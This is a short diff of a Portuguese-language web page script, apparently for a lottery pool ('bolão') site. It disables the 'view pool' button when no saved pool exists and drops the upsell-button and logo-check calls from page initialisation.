       if (!btn) return;
-      btn.addEventListener('click', function () {
-        abrirModalBolao();
-      });
+
+      // Se não existir bolão salvo, desabilita e muda texto
+      const bolao = getBolaoPreferencial();
+      if (!bolao || !Array.isArray(bolao.dezenas) || bolao.dezenas.length === 0) {
+        btn.disabled = true;
+        btn.textContent = 'NENHUM BOLÃO ENCONTRADO';
+        return;
+      }
+
+      btn.addEventListener('click', abrirModalBolao);
     }
 
-    // Inicialização
     if (document.readyState === 'loading') {
       document.addEventListener('DOMContentLoaded', function () {
         carregarDados();
-        configurarBotaoUpsell();
         configurarBotaoVerBolao();
-        verificarLogo();
       });
     } else {
       carregarDados();
-      configurarBotaoUpsell();
       configurarBotaoVerBolao();
-      verificarLogo();
     }
   </script>
 </body>
